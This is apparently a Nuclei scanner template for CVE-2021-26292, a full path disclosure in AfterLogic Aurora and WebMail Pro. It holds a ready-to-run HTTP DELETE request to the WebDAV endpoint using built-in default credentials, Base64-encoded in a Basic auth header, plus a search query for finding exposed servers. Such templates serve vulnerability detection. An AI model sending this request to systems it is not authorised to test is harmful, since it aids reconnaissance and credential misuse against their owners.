id: CVE-2021-26292

info:
  name: Public Full Path Disclosure on AfterLogic Aurora & WebMail Pro WebDAV EndPoint
  author: johnk3r
  severity: medium
  description: AfterLogic Aurora and WebMail Pro products with 7.7.9 and all lower versions are affected by this vulnerability, simply sending an HTTP DELETE request to WebDAV EndPoint with built-in “caldav_public_user@localhost” and it’s the predefined password “caldav_public_user” allows the attacker to obtain web root path.
  reference:
    - https://github.com/E3SEC/AfterLogic/blob/main/CVE-2021-26292-full-path-disclosure-vulnerability.md
  metadata:
    max-request: 1
    vendor: AfterLogic
    product: AfterLogic Aurora & WebMail
    fofa-query: "X-Server: AfterlogicDAVServer"
  tags: cve,cve2021,AfterLogic

http:
  - method: DELETE
    path:
      - "{{BaseURL}}/dav/server.php/files/personal/GIVE_ME_ERROR_TO_GET_DOC_ROOT_2021"

    headers:
      Authorization: "Basic Y2FsZGF2X3B1YmxpY191c2VyQGxvY2FsaG9zdDpjYWxkYXZfcHVibGljX3VzZXI"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "caldav_public_user"
          - "GIVE_ME_ERROR_TO_GET_DOC_ROOT_2021"
        condition: and

      - type: status
        status:
          - 404
